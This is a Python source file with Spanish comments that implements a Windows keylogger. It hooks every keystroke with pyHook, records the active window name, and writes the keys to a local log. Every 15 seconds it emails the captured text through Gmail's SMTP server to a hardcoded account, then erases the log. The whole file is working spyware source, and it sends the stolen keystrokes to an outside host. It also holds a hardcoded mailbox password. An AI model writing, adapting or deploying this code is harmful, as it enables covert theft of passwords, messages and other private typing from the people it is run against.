from distutils.debug import DEBUG
import pyHook, pythoncom, sys, logging, time, datetime


#carpeta en donde se registran las teclas
carpeta_destino= '.\\log.txt'
segundos_espera= 15
timeout= time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:
        return True
    else: 
        return False

#evento para registrar el correo y darle las tareas
def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace('Space', ' ')
        data = data.replace('Return', '\n')
        data = 'Mensaje capturado a las: '+ fecha + '\n\n' + data
        print (data)
        crearEmail('pruebakeyloggerpaste@gmail.com', 'pastelito123', 'pruebakeyloggerpaste@gmail.com', 'Nueva captura:' +fecha, data)
        f.seek(0)
        f.truncate()


#definir las variables para el correo
def crearEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser=user
    mailPass=passw
    From=user
    To=recep
    Subject=subj
    Txt=body


#establecer el formato para mandar las cosas al correo
    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

#usar SMTP para poder manipular correos
    try:
        server=smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print('Correo enviado con éxito!')

    except:
        print('Correo Fallido :C')

#registrar el evento en donde copia todas las teclas
def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='Ventana:    '+event.WindowName+' |    %(message)s')
    print ('WindowName:',event.WindowName)
    print ('Key:', event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()


#evento para q mande al correo cada tiempo definido, en este caso cada 15s
while True:
    if TimeOut():
        EnviarEmail()
        timeout= time.time()+ segundos_espera

    pythoncom.PumpWaitingMessages()